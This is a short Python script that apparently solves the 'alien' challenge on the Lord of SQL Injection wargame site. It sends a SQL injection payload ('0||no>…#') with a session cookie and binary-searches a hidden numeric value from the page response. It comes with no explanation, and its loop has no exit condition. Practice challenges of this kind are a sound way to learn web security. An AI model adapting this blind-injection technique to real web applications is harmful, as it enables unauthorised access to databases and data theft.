import requests

url = "https://los.rubiya.kr/chall/alien_91104597bf79b4d893425b65c166d484.php"
cookies = dict(PHPSESSID="33a17d5ikllqctdau572ms56ui")

start = 0
end = 1000000000
mid = (start+end)//2

while(True):
    no = mid
    response = requests.get(url, cookies=cookies, params={f"no":"0||no>{no}#"})
    print(response.request.url)

    if "sandbox2" in response.text:
        start = mid + 1
        mid = (start+end)//2
    else:
        end = mid - 1
        mid = (start+end)//2
